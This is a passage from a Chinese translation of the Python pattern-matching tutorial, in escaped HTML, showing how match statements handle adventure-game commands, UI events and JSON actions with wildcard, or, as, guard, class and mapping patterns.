&lt;span class="c1"># The rest of your commands go here&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这将匹配任何以&lt;code>“drop”&lt;/code>作为第一个元素的序列。所有剩余的元素都将在一个列表对象中被捕获，该列表对象将绑定到&lt;code>objects&lt;/code>变量。&lt;/p>
&lt;p>这种语法与序列解包有类似的限制:在一个模式中不能有多个带星号的名称。&lt;/p>
&lt;h3 id="添加通配符">添加通配符&lt;/h3>
&lt;p>您可能希望打印一条错误消息，说明当所有模式都失败时，无法识别该命令。您可以使用我们刚刚学习的特性，并将&lt;code>case [*ignored_words]&lt;/code>作为您的最后一个模式。然而，有一个更简单的方法:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;quit&amp;#34;&lt;/span>&lt;span class="p">]:&lt;/span> &lt;span class="o">...&lt;/span> &lt;span class="c1"># Code omitted for brevity&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;go&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">direction&lt;/span>&lt;span class="p">]:&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;drop&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">objects&lt;/span>&lt;span class="p">]:&lt;/span> &lt;span class="o">...&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># Other cases&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Sorry, I couldn&amp;#39;t understand &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">command&lt;/span>&lt;span class="si">!r}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这个特殊的模式被写成&lt;code>_&lt;/code>(称为通配符)。不管 subject 是什么它总是能匹配到，但它不绑定任何变量。&lt;/p>
&lt;p>注意，这将匹配任何对象，而不仅仅是序列。因此，只有将它单独作为最后一个模式才有意义(为了防止错误，Python会阻止您在其他&lt;code>case&lt;/code>之前使用它)。&lt;/p>
&lt;h3 id="模式组合">模式组合&lt;/h3>
&lt;p>这是一个很好的时机，可以从示例中退后一步，了解您一直在使用的模式是如何构建的。模式可以相互嵌套，我们已经在上面的例子中隐式地这样做了。&lt;/p>
&lt;p>我们已经看到了一些“简单”模式(这里的“简单”意味着它们不包含其他模式):&lt;/p>
&lt;ul>
&lt;li>捕获模式 Capture patterns (独立名称，如方向、动作、对象)。我们从未单独讨论过这些，而是将它们作为其他模式的一部分使用。&lt;/li>
&lt;li>字面值模式 Literal patterns (字符串字面值、数字字面值、&lt;code>True&lt;/code>、&lt;code>False&lt;/code>和&lt;code>None&lt;/code>)&lt;/li>
&lt;li>通配符模式 Wildcard pattern &lt;code>_&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>到目前为止，我们实验过的唯一一个非简单模式是序列模式。序列模式中的每个元素实际上都可以是任何其他模式。这意味着您可以编写像&lt;code>[&amp;quot;first&amp;quot;， (left, right)， _， *rest]&lt;/code>这样的模式。匹配的 subject 是一个至少包含三个元素的序列，其中第一个元素等于&lt;code>&amp;quot;first&amp;quot;&lt;/code>，第二个元素依次是两个元素的序列。它也会绑定&lt;code>left=subject[1][0]&lt;/code>， &lt;code>right=subject[1][1]&lt;/code>，&lt;code>rest =subject[3:]&lt;/code>&lt;/p>
&lt;h3 id="or-模式">or 模式&lt;/h3>
&lt;p>回到冒险游戏的例子中，你可能会发现你想要一些导致相同结果的模式。例如，您可能希望命令&lt;code>north&lt;/code>和&lt;code>go north&lt;/code>相等。您可能还希望为&lt;code>get X&lt;/code>可以有一些别名如&lt;code>pick x up&lt;/code>和&lt;code>pick up x&lt;/code>。&lt;/p>
&lt;p>模式中的|符号将它们组合为可选项。你可以这样写:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># Other cases&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;north&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;go&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;north&amp;#34;&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="n">current_room&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">neighbor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;north&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;get&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;pick&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;up&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;pick&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">obj&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;up&amp;#34;&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="o">...&lt;/span> &lt;span class="c1"># Code for picking up the given object&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这被称为&lt;strong>or模式&lt;/strong>，并将产生预期的结果。模式从左到右尝试；如果有多个可选匹配，通过从左至右这一规则可以知道是匹配到了哪个模式。在编写or模式时，一个重要的限制是所有备选项都应该绑定相同的变量。所以模式&lt;code>[1,x] | [2, y]&lt;/code>是不允许的，因为它会使匹配成功后绑定哪个变量变得不清楚。&lt;code>[1, x] | [2, x]&lt;/code>非常好，如果成功，将始终绑定&lt;code>x&lt;/code>。&lt;/p>
&lt;h3 id="捕获匹配的子模式">捕获匹配的子模式&lt;/h3>
&lt;p>我们的&lt;code>“go”&lt;/code>命令的第一个版本是用&lt;code>[“go”，direction]&lt;/code>模式编写的。我们在上一个版本中使用模式&lt;code>[&amp;quot;north&amp;quot;] | [&amp;quot;go&amp;quot;， &amp;quot;north&amp;quot;]&lt;/code>所做的改变有一些好处，但也有一些缺点:最新版本允许别名，但也有硬编码的方向别名&lt;code>&amp;quot;north&amp;quot;&lt;/code>，这将迫使我们实际上有独立的模式，&lt;code>north&lt;/code>/&lt;code>south&lt;/code>/&lt;code>east&lt;/code>/&lt;code>west&lt;/code>。这将导致一些代码重复，但同时我们得到了更好的输入验证，并且如果用户输入的命令是&lt;code>“go figure!”&lt;/code>而不是方向，我们将不会进入那个分支。&lt;/p>
&lt;p>我们可以试着在两个方面都做到最好(为了简洁，我省略了不使用&lt;code>“go”&lt;/code>的别名版本):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;go&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;north&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="s2">&amp;#34;south&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="s2">&amp;#34;east&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="s2">&amp;#34;west&amp;#34;&lt;/span>&lt;span class="p">)]:&lt;/span>
&lt;span class="n">current_room&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">neighbor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="c1"># how do I know which direction to go?&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这段代码是一个单独的分支，它验证&lt;code>“go”&lt;/code>之后的单词是否确实是一个方向。但移动玩家的代码需要知道选择了哪一个，但却无法做到这一点。我们需要的是一个行为类似于or模式但同时进行捕获的模式。我们可以使用&lt;strong>as模式&lt;/strong>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;go&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;north&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="s2">&amp;#34;south&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="s2">&amp;#34;east&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="s2">&amp;#34;west&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">direction&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="n">current_room&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">neighbor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">direction&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>as模式匹配左边的任何模式，同时也将值绑定到名称。&lt;/p>
&lt;h3 id="添加条件到模式">添加条件到模式&lt;/h3>
&lt;p>我们上面探讨的模式可以做一些强大的数据过滤，但有时您可能希望得到布尔表达式的全部功能。假设您实际上希望只允许&lt;code>“go”&lt;/code>命令出现在基于从&lt;code>current_room&lt;/code>的可能出口的受限方向集合中。我们可以通过在我们的案例中增加一个 &lt;strong>guard&lt;/strong> 来实现这一点。guard 由 if 关键字后跟任意表达式组成:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">command&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;go&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">direction&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">direction&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exits&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">current_room&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">current_room&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">neighbor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">direction&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;go&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">]:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Sorry, you can&amp;#39;t go that way&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>guard 不是模式的一部分，而是 case 的一部分。它只在模式匹配，并且所有模式变量都被绑定之后检查(这就是为什么条件可以在上面的例子中使用&lt;code>direction&lt;/code>变量)。如果模式匹配且条件为真，则 case body 正常执行。如果模式匹配，但条件为假，&lt;code>match&lt;/code>语句继续检查下一个条件，就好像模式没有匹配一样(可能的副作用是已经绑定了一些变量)。&lt;/p>
&lt;h3 id="添加ui-匹配对象">添加UI: 匹配对象&lt;/h3>
&lt;p>你的冒险游戏正走向成功，你被请求为游戏实现一个图形界面。您所选择的UI工具包允许您编写一个事件循环，您可以通过调用&lt;code>event.get()&lt;/code>来获取一个新的事件对象。根据用户的动作，结果对象可以有不同的类型和属性，例如:&lt;/p>
&lt;ul>
&lt;li>当用户按下某个键时，将生成&lt;code>KeyPress&lt;/code>对象。它有一个&lt;code>key_name&lt;/code>属性，其中包含所按键的名称，以及一些有关修饰符的其他属性。&lt;/li>
&lt;li>当用户单击鼠标时，将生成一个&lt;code>Click&lt;/code>对象。它有一个指针坐标的属性&lt;code>position&lt;/code>。&lt;/li>
&lt;li>当用户点击游戏窗口的关闭按钮时，会生成一个&lt;code>Quit&lt;/code>对象。&lt;/li>
&lt;/ul>
&lt;p>与其编写多个&lt;code>isinstance()&lt;/code>检查，你可以使用模式来识别不同类型的对象，也可以将模式应用到其属性上:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">event&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Click&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">position&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">handle_click_at&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">KeyPress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key_name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Q&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">Quit&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">game&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">quit&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">KeyPress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">key_name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;up arrow&amp;#34;&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">game&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">go_north&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">KeyPress&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="k">pass&lt;/span> &lt;span class="c1"># Ignore other keystrokes&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">other_event&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">ValueError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Unrecognized event: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">other_event&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>像&lt;code>Click(position=(x, y))&lt;/code>这样的模式仅在事件类型是&lt;code>Click&lt;/code>类的子类时才匹配。它还要求事件具有一个与&lt;code>(x, y)&lt;/code>模式匹配的位置属性。如果匹配，则局部变量&lt;code>x&lt;/code>和&lt;code>y&lt;/code>将得到期望的值。&lt;/p>
&lt;p>像&lt;code>KeyPress()&lt;/code>这样不带参数的模式将匹配任何&lt;code>KeyPress&lt;/code>类实例的对象。只有在模式中指定的属性才会匹配，其他任何属性都将被忽略。&lt;/p>
&lt;h3 id="匹配位置属性">匹配位置属性&lt;/h3>
&lt;p>前一节描述了在进行对象匹配时如何匹配命名属性。对于某些对象，可以方便地根据位置描述匹配的参数(特别是当只有几个属性并且它们有“标准”排序时)。如果您正在使用的类是命名元组 &lt;code>namedtuple&lt;/code> 或数据类 &lt;code>dataclass&lt;/code>，那么您可以按照构造对象时使用的相同顺序来实现这一点。例如，如果上面的UI框架像这样定义它们的类:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">dataclasses&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">dataclass&lt;/span>
&lt;span class="nd">@dataclass&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Click&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">tuple&lt;/span>
&lt;span class="n">button&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Button&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后你可以重写你的匹配语句来匹配上面的 subject:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">event&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Click&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">)):&lt;/span>
&lt;span class="n">handle_click_at&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>(x, y)&lt;/code>模式将自动匹配&lt;code>position&lt;/code>属性，因为模式中的第一个参数对应于数据类定义中的第一个属性。&lt;/p>
&lt;p>其他类的属性没有自然的顺序，因此需要在模式中使用显式名称来匹配它们的属性。但是，也可以手动指定属性的顺序，允许位置匹配，就像下面这个替代定义:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">Click&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">__match_args__&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="s2">&amp;#34;position&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;button&amp;#34;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">position&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">button&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>__match_args__&lt;/code>特殊属性定义了可以在&lt;code>case Click((x,y))&lt;/code>等模式中使用的属性的显式顺序。&lt;/p>
&lt;h3 id="匹配常量和枚举">匹配常量和枚举&lt;/h3>
&lt;p>上面的模式对所有鼠标按钮都一视同仁，但您已经决定只接受鼠标左键单击事件，而忽略其他鼠标按键。在做这一修改时，您注意到&lt;code>button&lt;/code>属性被定义为一个&lt;code>Button&lt;/code>，这是一个用&lt;code>enum.Enum&lt;/code>构建的枚举。实际上，你可以像这样匹配枚举值:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">event&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Click&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">button&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Button&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">LEFT&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="c1"># This is a left click&lt;/span>
&lt;span class="n">handle_click_at&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Click&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="k">pass&lt;/span> &lt;span class="c1"># ignore other clicks&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>这将适用于任何带点的名称(如&lt;code>math.pi&lt;/code>)。然而，非限定名称(即没有点的裸名称)将总是被解释为捕获模式，因此在模式中始终使用限定常量可以避免这种歧义。&lt;/p>
&lt;h3 id="走进云服务匹配字典">走进云服务：匹配字典&lt;/h3>
&lt;p>你决定制作游戏的在线版本。您的所有逻辑都将在服务器中，而客户端中的UI将使用JSON消息进行通信。通过json模块，这些将被映射到Python字典、列表和其他内置对象。&lt;/p>
&lt;p>我们的客户端将收到一个字典列表(从JSON解析)，包含了要采取的动作，每个元素的查找示例如下:&lt;/p>
&lt;ul>
&lt;li>&lt;code>{&amp;quot;text&amp;quot;: &amp;quot;The shop keeper says 'Ah! We have Camembert, yes sir'&amp;quot;, &amp;quot;color&amp;quot;: &amp;quot;blue&amp;quot;}&lt;/code>&lt;/li>
&lt;li>如果客户端应该暂停&lt;code>{&amp;quot;sleep&amp;quot;: 3}&lt;/code>&lt;/li>
&lt;li>播放声音 &lt;code>{&amp;quot;sound&amp;quot;: &amp;quot;filename.ogg&amp;quot;, &amp;quot;format&amp;quot;: &amp;quot;ogg&amp;quot;}&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>到目前为止，我们的模式已经处理了序列，但是也有一些模式可以根据它们当前的键匹配映射。在这种情况下，你可以使用:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">for&lt;/span> &lt;span class="n">action&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">actions&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">match&lt;/span> &lt;span class="n">action&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;text&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">message&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;color&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">}:&lt;/span>
&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">set_text_color&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">display&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;sleep&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">duration&lt;/span>&lt;span class="p">}:&lt;/span>
&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">duration&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;sound&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">url&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;format&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;ogg&amp;#34;&lt;/span>&lt;span class="p">}:&lt;/span>
&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">play&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;sound&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;format&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">}:&lt;/span>
&lt;span class="n">warning&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Unsupported audio format&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>映射模式中的键需要是字面值，但是值可以是任何模式。与序列模式一样，所有子模式都必须匹配通用模式才能匹配。&lt;/p>
&lt;p>您可以在映射模式中使用&lt;code>**rest&lt;/code>来捕获 subject 中的附加键。请注意，如果你忽略了这一点，在匹配时，主题中的额外键将被忽略，例如，消息&lt;code>{&amp;quot;text&amp;quot;: &amp;quot;foo&amp;quot;， &amp;quot;color&amp;quot;: &amp;quot;red&amp;quot;， &amp;quot;style&amp;quot;: &amp;quot;bold&amp;quot;}&lt;/code>将匹配上面例子中的第一个模式。&lt;/p>
&lt;h3 id="匹配内建类-builtin-classes">匹配内建类 builtin classes&lt;/h3>
&lt;p>上面的代码可以需要一些验证。如果消息来自外部源，则字段的类型可能是错误的，从而导致错误或安全问题。&lt;/p>
&lt;p>任何类都是有效的匹配目标，其中包括&lt;code>bool&lt;/code>、&lt;code>str&lt;/code>或&lt;code>int&lt;/code>等内置类，这允许我们将上面的代码与类模式结合起来。因此，我们可以使用 &lt;code>{&amp;quot;text&amp;quot;: str() as message, &amp;quot;color&amp;quot;: str() as c}&lt;/code>来代替&lt;code>{&amp;quot;text&amp;quot;: message, &amp;quot;color&amp;quot;: c}&lt;/code>来确保&lt;code>message&lt;/code>和&lt;code>c&lt;/code>都是字符串。对于许多内置类(参见PEP-634了解整个列表)，可以使用位置参数作为简写，写成&lt;code>str(c)&lt;/code>而不是&lt;code>str() as c&lt;/code>。完全重写的版本如下所示:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">for&lt;/span> &lt;span class="n">action&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">actions&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">match&lt;/span> &lt;span class="n">action&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;text&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;color&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)}:&lt;/span>
&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">set_text_color&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">display&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">message&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;sleep&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">float&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">duration&lt;/span>&lt;span class="p">)}:&lt;/span>
